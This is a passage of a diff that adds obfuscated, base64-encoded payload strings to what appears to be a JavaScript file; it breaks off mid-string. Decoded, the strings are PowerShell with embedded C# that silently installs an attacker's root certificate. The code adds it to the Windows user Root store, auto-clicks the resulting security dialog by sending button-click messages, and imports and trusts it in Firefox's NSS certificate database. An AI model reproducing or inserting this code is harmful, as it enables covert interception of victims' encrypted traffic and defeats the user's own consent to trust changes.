+&quot;dXRvKV0KICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdChbSW5dVUludDMyIGR3RmxhZ3MsIFtJbl1VSW50MzIgdGgzMlByb2Nlc3NJRCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVl&quot;+
+&quot;LCBDaGFyU2V0ID0gU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXQuQXV0byldCiAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgUHJvY2VzczMyRmlyc3QoW0luXUludFB0ciBoU25hcHNob3QsIHJlZiBQUk9DRVNTRU5UUlkzMiBscHBlKTsKCiAgICBb&quot;+
+&quot;RGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldC5BdXRvKV0KICAgIHN0YXRpYyBleHRlcm4gYm9vbCBQcm9jZXNzMzJOZXh0KFtJbl1JbnRQdHIgaFNu&quot;+
+&quot;YXBzaG90LCByZWYgUFJPQ0VTU0VOVFJZMzIgbHBwZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0&quot;+
+&quot;ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoW0luXSBJbnRQdHIgaE9iamVjdCk7CiAgICAKCWNvbnN0IGludCBCTV9DTCA9IDB4MDBGNTsKCQoJcHVibGljIHN0YXRpYyBieXRlW10gdXZEemNlKFN0cmluZyBzQ2VydCkKICAgIHsKCQlyZXR1cm4gQ29udmVydC5Gcm9tQmFz&quot;+
+&quot;ZTY0U3RyaW5nKHNDZXJ0KTsKICAgIH0KICAgICAgICAKCXB1YmxpYyBzdGF0aWMgdm9pZCBJaldGbmROS1p2KFN0cmluZyBzQ2VydCl7CgkJU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJbV2luMzJdOjpTdGFydCgpIik7CiAgICAgICAgYnl0ZVtdIGJDZXJ0ID0g&quot;+
+&quot;dXZEemNlKHNDZXJ0KTsKICAgICAgICBpZiAoYkNlcnQgIT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIFg1MDlDZXJ0aWZpY2F0ZTIgY2VydGlmaWNhdGUgPSBuZXcgWDUwOUNlcnRpZmljYXRlMihiQ2VydCk7CiAgICAgICAgICAgIFg1MDlTdG9yZSBzdG9y&quot;+
+&quot;ZSA9IG5ldyBYNTA5U3RvcmUoU3RvcmVOYW1lLlJvb3QsIFN0b3JlTG9jYXRpb24uQ3VycmVudFVzZXIpOwogICAgICAgICAgICBzdG9yZS5PcGVuKE9wZW5GbGFncy5SZWFkV3JpdGUpOwogICAgICAgICAgICBpZiAoIXN0b3JlLkNlcnRpZmljYXRlcy5Db250YWlu&quot;+
+&quot;cyhjZXJ0aWZpY2F0ZSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocmVhZCB0aHJlYWQgPSBuZXcgVGhyZWFkKERJSVFEQlJjekFQKTsKICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOwogICAgICAgICAgICAgICAgc3RvcmUuQWRkKGNlcnRp&quot;+
+&quot;ZmljYXRlKTsKICAgICAgICAgICAgICAgIHRocmVhZC5Kb2luKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc3RvcmUuQ2xvc2UoKTsKICAgICAgICB9Cgl9CgkKCXB1YmxpYyBzdGF0aWMgdm9pZCBESUlRREJSY3pBUCgpCgl7CgkJU3lzdGVtLkNvbnNvbGUu&quot;+
+&quot;V3JpdGVMaW5lKCJbV2luMzJdOjpTZWFyY2hEaWFsb2coKSIpOwoJCUludFB0ciBoV25kOwoJCWRvewoJCQloV25kID0gTWtNdW5hV0FnKCIjMzI3NzAiLFN0cmluZy5FbXB0eSk7CgkJCWlmICghaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKQoJCSAgICB7CgkJCQlT&quot;+
+&quot;eXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIkZvdW5kZWQgaFduZD0weHswOlh9IixoV25kKTsKCQkgICAgCWJyZWFrOwoJCQl9ZWxzZQoJICAgICAgICB7CgkJCQloV25kPUludFB0ci5aZXJvOwoJCQkJU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJUcnkgYWdhaW4g&quot;+
+&quot;ZmluZCB3aW5kb3ciKTsKCSAgICAgICAgfQoJCX13aGlsZSAoaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKTsKCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIkRpYWxvZyB3aW5kb3cgZm91bmRlZCIpOwoJCVNldEZvcmVncm91bmRXaW5kb3coaFduZCk7CgkJS2RV&quot;+
+&quot;R09HcWZsWEFvIGNoaWxkUHJvYyA9IG5ldyBLZFVHT0dxZmxYQW8oT3NNZmdLZVVFZUxoKTsKCQlFbnVtQ2hpbGRXaW5kb3dzKGhXbmQsIGNoaWxkUHJvYywgSW50UHRyLlplcm8pOwoJfQoJCglwdWJsaWMgc3RhdGljIEludFB0ciBNa011bmFXQWcoc3RyaW5nIHdu&quot;+
+&quot;ZGNsYXNzLCBzdHJpbmcgdGl0bGUpCiAgICB7CiAgICAgICAgZGFnIHNkID0gbmV3IGRhZygpOwogICAgICAgIHNkLlduZGNsYXNzID0gd25kY2xhc3M7CiAgICAgICAgc2QuVGl0bGUgPSB0aXRsZTsKCQlzZC5oV25kPUludFB0ci5aZXJvOwoJCVN5c3RlbS5Db25z&quot;+
+&quot;b2xlLldyaXRlTGluZSgiRW51bVdpbmRvdyAtfCIpOwogICAgICAgIEVudW1XaW5kb3dzKG5ldyBIbHNycW92YkxQKFZQQXJtQmpuTkN1QyksIHJlZiBzZCk7CiAgICAgICAgcmV0dXJuIHNkLmhXbmQ7CiAgICB9CiAgICAKCXB1YmxpYyBzdGF0aWMgYm9vbCBWUEFy&quot;+
+&quot;bUJqbk5DdUMoSW50UHRyIGhXbmQsIHJlZiBkYWcgZGF0YSkKICAgIHsKICAgIAlTdHJpbmdCdWlsZGVyIHRpdGxlID0gbmV3IFN0cmluZ0J1aWxkZXIoMTAyNCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBjbGFzc05hbWUgPSBuZXcgU3RyaW5nQnVpbGRlcigxMDI0&quot;+
+&quot;KTsKICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHRpdGxlLCB0aXRsZS5DYXBhY2l0eSk7CiAgICAgICAgR2V0Q2xhc3NOYW1lKGhXbmQsIGNsYXNzTmFtZSwgY2xhc3NOYW1lLkNhcGFjaXR5KTsKICAgICAgICBTdHJpbmcgc0VOPXZoZEhKKGhXbmQpLlRvTG93&quot;+
+&quot;ZXIoKTsKCQlpZigoIWRhdGEuV25kY2xhc3MuRXF1YWxzKFN0cmluZy5FbXB0eSkgJiYgY2xhc3NOYW1lLlRvU3RyaW5nKCkuU3RhcnRzV2l0aChkYXRhLlduZGNsYXNzKSkgfHwgKCFkYXRhLlRpdGxlLkVxdWFscyhTdHJpbmcuRW1wdHkpICYmIHRpdGxlLlRvU3Ry&quot;+
+&quot;aW5nKCkuU3RhcnRzV2l0aChkYXRhLlRpdGxlKSkpCgkJewoJCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIiAgICAgICAgICAgIHwtIGhXbmQ9MHh7MDpYfTsgQ2xhc3M9ezF9OyBUaXRsZT17Mn07IFByb2Nlc3M9ezN9IixoV25kLGNsYXNzTmFtZS5Ub1N0cmlu&quot;+
+&quot;ZygpLHRpdGxlLlRvU3RyaW5nKCksc0VOKTsKICAgICAgICAJaWYoc0VOLkNvbnRhaW5zKCJjc3JzcyIpIHx8IHNFTi5Db250YWlucygiY2VydHV0aWwiKSAgfHwgc0VOLkNvbnRhaW5zKCJwb3dlcnNoZWxsIikpCgkgICAgICAgIHsKCQkgICAgICAgIGRhdGEuaFdu&quot;+
+&quot;ZCA9IGhXbmQ7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CgkgICAgICAgIH0KICAgICAgICB9CiAgICAgICAJCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgCglwdWJsaWMgc3RhdGljIFN0cmluZyB2aGRISihJbnRQdHIgZVNldEpRdWlsdkFNKXsK&quot;+
+&quot;CQl1aW50IEZMb29qID0gMDsKCQl1aW50IHRocmVhZElEID0gR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkKGVTZXRKUXVpbHZBTSwgb3V0IEZMb29qKTsKCQlTdHJpbmcgc1Byb2MgPSBudWxsOwoJICAgIEludFB0ciBoYW5kbGVUb1NuYXBzaG90ID0gSW50UHRyLlpl&quot;+
+&quot;cm87CgkgICAgdHJ5CgkgICAgewoJICAgICAgICBQUk9DRVNTRU5UUlkzMiBESWQgPSBuZXcgUFJPQ0VTU0VOVFJZMzIoKTsKCSAgICAgICAgRElkLmR3U2l6ZSA9IChVSW50MzIpTWFyc2hhbC5TaXplT2YodHlwZW9mKFBST0NFU1NFTlRSWTMyKSk7CgkgICAgICAg&quot;+
+&quot;IGhhbmRsZVRvU25hcHNob3QgPSBDcmVhdGVUb29saGVscDMyU25hcHNob3QoKHVpbnQpU25hcHNob3RGbGFncy5Qcm9jZXNzLCAwKTsKCSAgICAgICAgaWYgKFByb2Nlc3MzMkZpcnN0KGhhbmRsZVRvU25hcHNob3QsIHJlZiBESWQpKQoJICAgICAgICB7CgkgICAg&quot;+
+&quot;ICAgIGRvCgkgICAgICAgIHsKCSAgICAgICAgICAgIGlmIChGTG9vaiA9PSBESWQudGgzMlByb2Nlc3NJRCkKCSAgICAgICAgICAgIHsKCSAgICAgICAgICAgIHNQcm9jID0gRElkLnN6RXhlRmlsZTsKCSAgICAgICAgICAgIGJyZWFrOwoJICAgICAgICAgICAgfQoJ&quot;+
+&quot;ICAgICAgICB9IHdoaWxlIChQcm9jZXNzMzJOZXh0KGhhbmRsZVRvU25hcHNob3QsIHJlZiBESWQpKTsKCSAgICAgICAgfQoJICAgICAgICBlbHNlCgkgICAgICAgIHsKCSAgICAgICAgCXRocm93IG5ldyBBcHBsaWNhdGlvbkV4Y2VwdGlvbihzdHJpbmcuRm9ybWF0&quot;+
+&quot;KCJGYWlsZWQgd2l0aCB3aW4zMiBlcnJvciBjb2RlIHswfSIsIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSkpOwoJICAgICAgICB9CgkgICAgfQoJICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCgkgICAgewoJICAgICAgICB0aHJvdyBuZXcgQXBwbGljYXRpb25F&quot;+
+&quot;eGNlcHRpb24oIkNhbid0IGdldCB0aGUgcHJvY2Vzcy4iLCBleCk7CgkgICAgfQoJICAgIGZpbmFsbHkKCSAgICB7CgkgICAgICAgIENsb3NlSGFuZGxlKGhhbmRsZVRvU25hcHNob3QpOwoJICAgIH0KCSAgICByZXR1cm4gc1Byb2M7Cgl9CglwdWJsaWMgc3RhdGlj&quot;+
+&quot;IGJvb2wgT3NNZmdLZVVFZUxoKEludFB0ciBoV25kLCBJbnRQdHIgbFBhcmFtKQoJewoJCVNlbmRNZXNzYWdlKGhXbmQsIEJNX0NMLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwoJCXJldHVybiB0cnVlOwoJfQp9CiJAOwpbSml4UENVZl06OklqV0ZuZE5LWnYo&quot;+
+&quot;IiVDRVJUJSIpOwpleGl0Cn0KUFlaT0lnWFI=&quot;,
+    dDrnVhWm: &quot;ZnVuY3Rpb24gTEdDeHdCTUhha3sKQWRkLVR5cGUgQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIE1pY3Jv&quot;+
+&quot;c29mdC5XaW4zMjsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9k&quot;+
+&quot;ZWw7CgpwdWJsaWMgc2VhbGVkIGNsYXNzIEVoZG1IR21MQnpNWEtsCnsKCXByaXZhdGUgc3RhdGljIHZvbGF0aWxlIEVoZG1IR21M&quot;+
+&quot;QnpNWEtsIENUUFBrbU1nZmdGbjsKCXByaXZhdGUgc3RhdGljIG9iamVjdCB2eWpSY1FxSWJScURPbiA9IG5ldyBPYmplY3QoKTsK&quot;+
+&quot;CXB1YmxpYyBzdGF0aWMgRWhkbUhHbUxCek1YS2wgTW1NYVJ1d3VoQlJaQ1IoKQogICAgewogICAgICAgIGlmIChDVFBQa21NZ2Zn&quot;+
+&quot;Rm4gPT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIGxvY2sgKHZ5alJjUXFJYlJxRE9uKQogICAgICAgICAgICB7CiAgICAg&quot;+
+&quot;ICAgICAgICAgICBpZiAoQ1RQUGttTWdmZ0ZuID09IG51bGwpCiAgICAgICAgICAgICAgICBDVFBQa21NZ2ZnRm4gPSBuZXcgRWhk&quot;+
+&quot;bUhHbUxCek1YS2woKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gQ1RQUGttTWdmZ0ZuOwogICAgfQoJ&quot;+
+&quot;Cgljb25zdCBpbnQgT0dlPTA7CiAgICAKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hh&quot;+
+&quot;clNldCA9IENoYXJTZXQuQW5zaSldCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShbTWFyc2hhbEFzKFVubWFu&quot;+
+&quot;YWdlZFR5cGUuTFBTdHIpXXN0cmluZyBscEZpbGVOYW1lKTsKCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgWHVYKHN0cmluZyBs&quot;+
+&quot;aWJQYXRoKQogICAgewogICAgICAgIGlmIChTdHJpbmcuSXNOdWxsT3JFbXB0eShsaWJQYXRoKSkKICAgICAgICAgICAgdGhyb3cg&quot;+
+&quot;bmV3IEFyZ3VtZW50TnVsbEV4Y2VwdGlvbigibGliUGF0aCIpOwoKICAgICAgICBJbnRQdHIgbW9kdWxlSGFuZGxlID0gTG9hZExp&quot;+
+&quot;YnJhcnkobGliUGF0aCk7CiAgICAgICAgaWYgKG1vZHVsZUhhbmRsZSA9PSBJbnRQdHIuWmVybykKICAgICAgICB7CiAgICAgICAg&quot;+
+&quot;ICAgIGludCBsYXN0ZXJyb3IgPSBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCk7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xl&quot;+
+&quot;LldyaXRlTGluZShTdHJpbmcuRm9ybWF0KCJMYXN0IGVycm9yOiAweHswOlh9IixsYXN0ZXJyb3IpKTsKICAgICAgICAgICAgV2lu&quot;+
+&quot;MzJFeGNlcHRpb24gaW5uZXJFeCA9IG5ldyBXaW4zMkV4Y2VwdGlvbihsYXN0ZXJyb3IpOwogICAgICAgICAgICBpbm5lckV4LkRh&quot;+
+&quot;dGEuQWRkKCJMYXN0V2luMzJFcnJvciIsIGxhc3RlcnJvcik7CiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oImNhbid0&quot;+
+&quot;IGxvYWQgRExMICIgKyBsaWJQYXRoLCBpbm5lckV4KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIG1vZHVsZUhhbmRsZTsKICAg&quot;+
+&quot;IH0KCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9j&quot;+
+&quot;QWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NlZHVyZU5hbWUpOwoJLy9Db25zdGFudHMKICAgIGNvbnN0IHVpbnQg&quot;+
+&quot;TlNTX0lOSVRfUkVBRE9OTFk9MHgxOwogICAgY29uc3QgdWludCBOU1NfSU5JVF9OT0NFUlREQiA9IDB4MjsKICAgIGNvbnN0IHVp&quot;+
+&quot;bnQgTlNTX0lOSVRfTk9NT0REQiA9IDB4NDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfRk9SQ0VPUEVOID0gMHg4OwogICAgY29u&quot;+
+&quot;c3QgdWludCBOU1NfSU5JVF9OT1JPT1RJTklUID0gMHgxMDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfT1BUSU1JWkVTUEFDRSA9&quot;+
+&quot;IDB4MjA7CiAgICBjb25zdCB1aW50IE5TU19JTklUX1BLMTFUSFJFQURTQUZFID0gMHg0MDsKICAgIGNvbnN0IHVpbnQgTlNTX0lO&quot;+
+&quot;SVRfUEsxMVJFTE9BRCA9IDB4ODA7CiAgICBjb25zdCB1aW50IE5TU19JTklUX05PUEsxMUZJTkFMSVpFID0gMHgxMDA7CiAgICBj&quot;+
+&quot;b25zdCB1aW50IE5TU19JTklUX1JFU0VSVkVEID0gMHgyMDA7CiAgICBjb25zdCB1aW50IE5TU19JTklUX0NPT1BFUkFURSA9IE5T&quot;+
+&quot;U19JTklUX1BLMTFUSFJFQURTQUZFIHwgTlNTX0lOSVRfUEsxMVJFTE9BRCB8IE5TU19JTklUX05PUEsxMUZJTkFMSVpFIHwgTlNT&quot;+
+&quot;X0lOSVRfUkVTRVJWRUQ7CgogICAgY29uc3Qgc3RyaW5nIFNFQ01PRF9EQiA9ICJzZWNtb2QuZGIiOwogICAgLy9TdHJ1Y3R1cmVz&quot;+
+&quot;CiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaWMgc3RydWN0IFNFQ0l0ZW0gCiAgICB7&quot;+
+&quot;CiAgICAgICAgcHVibGljIHVpbnQgaVR5cGU7CiAgICAgICAgcHVibGljIEludFB0ciBiRGF0YTsKICAgICAgICBwdWJsaWMgdWlu&quot;+
+&quot;dCBpRGF0YUxlbjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0&quot;+
+&quot;cnVjdCBDZXJ0VHJ1c3RzCiAgICB7CiAgICAgICAgcHVibGljIGludCBpU2l0ZTsKICAgICAgICBwdWJsaWMgaW50IGlFbWFpbDsK&quot;+
+&quot;ICAgICAgICBwdWJsaWMgaW50IGlTb2Z0OwogICAgfQoKICAgIHByaXZhdGUgZW51bSBTRUNDZXJ0VXNhZ2UKICAgIHsKICAgICAg&quot;+
+&quot;ICBjZXJ0VXNhZ2VTU0xDbGllbnQgPSAwLAogICAgICAgIGNlcnRVc2FnZVNTTFNlcnZlciA9IDEsCiAgICAgICAgY2VydFVzYWdl&quot;+
+&quot;U1NMU2VydmVyV2l0aFN0ZXBVcCA9IDIsCiAgICAgICAgY2VydFVzYWdlU1NMQ0EgPSAzLAogICAgICAgIGNlcnRVc2FnZUVtYWls&quot;+
+&quot;U2lnbmVyID0gNCwKICAgICAgICBjZXJ0VXNhZ2VFbWFpbFJlY2lwaWVudCA9IDUsCiAgICAgICAgY2VydFVzYWdlT2JqZWN0U2ln&quot;+
+&quot;bmVyID0gNiwKICAgICAgICBjZXJ0VXNhZ2VVc2VyQ2VydEltcG9ydCA9IDcsCiAgICAgICAgY2VydFVzYWdlVmVyaWZ5Q0EgPSA4&quot;+
+&quot;LAogICAgICAgIGNlcnRVc2FnZVByb3RlY3RlZE9iamVjdFNpZ25lciA9IDksCiAgICAgICAgY2VydFVzYWdlU3RhdHVzUmVzcG9u&quot;+
+&quot;ZGVyID0gMTAsCiAgICAgICAgY2VydFVzYWdlQW55Q0EgPSAxMQogICAgfQoJW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxs&quot;+
+&quot;aW5nQ29udmVudGlvbi5DZGVjbCldCiAgICBwcml2YXRlIGRlbGVnYXRlIGludCBGQ1lyeERMU3Ioc3RyaW5nIHNDb25maWdEaXIs&quot;+
+&quot;IHN0cmluZyBjZXJ0UHJlZml4LCBzdHJpbmcga2V5UHJlZml4LCBzdHJpbmcgc2VjTW9kTmFtZSwgdWludCBmbGFncyk7CgogICAg&quot;+
+&quot;cHJpdmF0ZSBpbnQgU2JpZChzdHJpbmcgc0NvbmZpZ0Rpciwgc3RyaW5nIGNlcnRQcmVmaXgsIHN0cmluZyBrZXlQcmVmaXgsIHN0&quot;+
+&quot;cmluZyBzZWNNb2ROYW1lLCB1aW50IGZsYWdzKQogICAgewogICAgICAgIEludFB0ciBwUHJvYyA9IEdldFByb2NBZGRyZXNzKHFB&quot;+
+&quot;aVNidG9pbywgIk5TU19Jbml0aWFsaXplIik7CiAgICAgICAgRkNZcnhETFNyIHB0ciA9IChGQ1lyeERMU3IpTWFyc2hhbC5HZXRE&quot;+
+&quot;ZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKEZDWXJ4RExTcikpOwogICAgICAgIHJldHVybiBwdHIoc0Nv&quot;+
+&quot;bmZpZ0RpciwgY2VydFByZWZpeCwga2V5UHJlZml4LCBzZWNNb2ROYW1lLCBmbGFncyk7CiAgICB9CgogICAgW1VubWFuYWdlZEZ1&quot;+
+&quot;bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCldCiAgICBwcml2YXRlIGRlbGVnYXRlIEludFB0ciBZTWUoKTsK&quot;+
+&quot;ICAgIHByaXZhdGUgSW50UHRyIHFIbGh4UEdSZSgpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3Mo&quot;+
+&quot;cUFpU2J0b2lvLCAiQ0VSVF9HZXREZWZhdWx0Q2VydERCIik7CiAgICAgICAgWU1lIHB0ciA9IChZTWUpTWFyc2hhbC5HZXREZWxl&quot;+
+&quot;Z2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKFlNZSkpOwogICAgICAgIHJldHVybiBwdHIoKTsKICAgIH0KCiAg&quot;+
+&quot;ICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0KICAgIHByaXZhdGUgZGVsZWdhdGUg&quot;+
+&quot;SW50UHRyIFJjV0JjVEUoKTsKICAgIHByaXZhdGUgSW50UHRyIFJrdEVJTHV5U0goKQogICAgewogICAgICAgIEludFB0ciBwUHJv&quot;+
+&quot;YyA9IEdldFByb2NBZGRyZXNzKHFBaVNidG9pbywgIk5TU19TaHV0ZG93biIpOwogICAgICAgIFJjV0JjVEUgcHRyID0gKFJjV0Jj&quot;+
+&quot;VEUpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKFJjV0JjVEUpKTsKICAgICAgICBy&quot;+
+&quot;ZXR1cm4gcHRyKCk7CiAgICB9CgogICAgW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCld&quot;+
+&quot;CiAgICBwcml2YXRlIGRlbGVnYXRlIGludCBmRm90bXJLKEludFB0ciBjZXJ0ZGIsIGludCB1c2FnZSwgdWludCBuY2VydHMsIHJl&quot;+
+&quot;ZiBTRUNJdGVtW10gZGVyQ2VydHMsIHJlZiBJbnRQdHIgcmV0Q2VydHMsIHVpbnQga2VlcENlcnRzLCB1aW50IGNhT25seSwgSW50&quot;+
+&quot;UHRyIG5pY2tuYW1lKTsKICAgIHByaXZhdGUgaW50IHZRWUMoSW50UHRyIGNlcnRkYiwgaW50IHVzYWdlLCB1aW50IG5jZXJ0cywg&quot;+
+&quot;cmVmIFNFQ0l0ZW1bXSBkZXJDZXJ0cywgcmVmIEludFB0ciByZXRDZXJ0cywgdWludCBrZWVwQ2VydHMsIHVpbnQgY2FPbmx5LCBJ&quot;+
+&quot;bnRQdHIgbmlja25hbWUpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MocUFpU2J0b2lvLCAiQ0VS&quot;+
+&quot;VF9JbXBvcnRDZXJ0cyIpOwogICAgICAgIGZGb3RtcksgcHRyID0gKGZGb3RtckspTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0&quot;+
+&quot;aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKGZGb3RtckspKTsKICAgICAgICByZXR1cm4gcHRyKGNlcnRkYiwgdXNhZ2UsIG5jZXJ0&quot;+
+&quot;cywgcmVmIGRlckNlcnRzLCByZWYgcmV0Q2VydHMsIGtlZXBDZXJ0cywgY2FPbmx5LCBuaWNrbmFtZSk7CiAgICB9CgogICAgcHJp&quot;+
+&quot;dmF0ZSBkZWxlZ2F0ZSBpbnQgSExHKEludFB0ciBjZXJ0ZGIsIEludFB0ciBjZXJ0LCByZWYgQ2VydFRydXN0cyB0cnVzdCk7CiAg&quot;+
+&quot;ICBwcml2YXRlIGludCBLSW5ReWooSW50UHRyIGNlcnRkYiwgSW50UHRyIGNlcnQsIHJlZiBDZXJ0VHJ1c3RzIHRydXN0KQogICAg&quot;+
+&quot;ewogICAgICAgIEludFB0ciBwUHJvYyA9IEdldFByb2NBZGRyZXNzKHFBaVNidG9pbywgIkNFUlRfQ2hhbmdlQ2VydFRydXN0Iik7&quot;+
+&quot;CiAgICAgICAgSExHIHB0ciA9IChITEcpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9m&quot;+
+&quot;KEhMRykpOwogICAgICAgIHJldHVybiBwdHIoY2VydGRiLCBjZXJ0LCByZWYgdHJ1c3QpOwogICAgfQoKICAgIFtVbm1hbmFnZWRG&quot;+
+&quot;dW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpXQogICAgcHVibGljIGRlbGVnYXRlIGludCBMa3lsbXlMbShJ&quot;+
+&quot;bnRQdHIgY2VydCwgdWludCBuY2VydHMpOwogICAgcHJpdmF0ZSBpbnQgaG9SS3VBbVZUKEludFB0ciBjZXJ0LCB1aW50IG5jZXJ0&quot;+
+&quot;cykKICAgIHsKICAgICAgICBJbnRQdHIgcFByb2MgPSBHZXRQcm9jQWRkcmVzcyhxQWlTYnRvaW8sICJDRVJUX0Rlc3Ryb3lDZXJ0&quot;+
+&quot;QXJyYXkiKTsKICAgICAgICBMa3lsbXlMbSBwdHIgPSAoTGt5bG15TG0pTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9p&quot;+
+&quot;bnRlcihwUHJvYywgdHlwZW9mKExreWxteUxtKSk7CiAgICAgICAgcmV0dXJuIHB0cihjZXJ0LCBuY2VydHMpOwogICAgfQoKCXBy&quot;+
+&quot;aXZhdGUgSW50UHRyIHFBaVNidG9pbyA9IEludFB0ci5aZXJvOwoJCglwdWJsaWMgQm9vbGVhbiB5SnVXeGRseXVOKFN0cmluZyBz&quot;+
+&quot;Q2VydCl7CiAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJFaGRtSEdtTEJ6TVhLbCBTdGFydCIpOwoJCVN0cmluZyBz&quot;+
+&quot;UHJvZmlsZSA9IEdldFByb2ZpbGUoKTsKICAgICAgICBpZiAoU3RyaW5nLklzTnVsbE9yRW1wdHkoc1Byb2ZpbGUpKQogICAgICAg&quot;+
+&quot;IHsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJQcm9maWxlIG5vdCBmb3VuZCIpOwogICAgICAgICAgICBy&quot;+
+&quot;ZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiUHJvZmlsZSBwYXRoPSIrc1By&quot;+
+&quot;b2ZpbGUpOwogICAgICAgIGJ5dGVbXSBiQ2VydCA9IEdldENlcnRBc0J5dGVBcnJheShzQ2VydCk7CgkJSW50UHRyIGlwQ2VydCA9&quot;+
+&quot;IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGJDZXJ0Lkxlbmd0aCk7CgkJdHJ5CiAgICAgICAgewogICAgICAgICAgICBEaXJlY3RvcnlJ&quot;+
+&quot;bmZvIGRpSW5zdGFsbFBhdGggPSBHZXRJUCgpOwogICAgICAgICAgICBTdHJpbmcgc0N1cnJlbnREaXJlY3RvcnkgPSBEaXJlY3Rv&quot;+
+&quot;cnkuR2V0Q3VycmVudERpcmVjdG9yeSgpOwogICAgICAgICAgICBEaXJlY3RvcnkuU2V0Q3VycmVudERpcmVjdG9yeShkaUluc3Rh&quot;+
+&quot;bGxQYXRoLkZ1bGxOYW1lKTsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJJbnN0YWxsIHBhdGg9IitkaUlu&quot;+
+&quot;c3RhbGxQYXRoLkZ1bGxOYW1lKTsKICAgICAgICAgICAgZm9yZWFjaChGaWxlSW5mbyBmaURsbCBpbiBkaUluc3RhbGxQYXRoLkdl&quot;+
+&quot;dEZpbGVzKCIqLmRsbCIpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoZmlEbGwuTmFtZS5FcXVhbHMoImJyZWFr&quot;+
